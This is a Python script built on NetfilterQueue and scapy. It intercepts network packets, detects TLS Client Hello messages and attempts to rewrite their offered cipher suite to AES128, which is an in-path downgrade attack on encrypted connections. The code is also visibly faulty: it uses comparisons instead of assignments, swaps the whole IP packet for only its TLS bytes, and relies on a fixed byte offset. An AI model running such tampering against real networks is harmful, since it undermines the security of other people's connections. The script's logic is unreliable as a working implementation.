from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

def print_and_accept(pkt):
    print(pkt)
    pkt.accept()

def process_packet(pkt):
    ip = IP(pkt.get_payload())
    if (ip.haslayer(Raw)):
        pkt_bytes = bytes(ip[Raw].load)
        # Filter Client Hello TLS messages
        # The Content type is Handshake (0x16 = 22)
        # Handshake Type is Client Hello (0x01 = 1)
        if (pkt_bytes[0] == 0x16 and pkt_bytes[5] == 0x01):
            # Set ciphersuite to AES128 which has code 00 2f
            new_payload = [x for x in pkt_bytes]
            new_payload[46] == 0x00
            new_payload[47] == 0x2f
            pkt.set_payload(bytes(new_payload))

    pkt.accept()       

nfqueue = NetfilterQueue()
nfqueue.bind(1, process_packet)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()    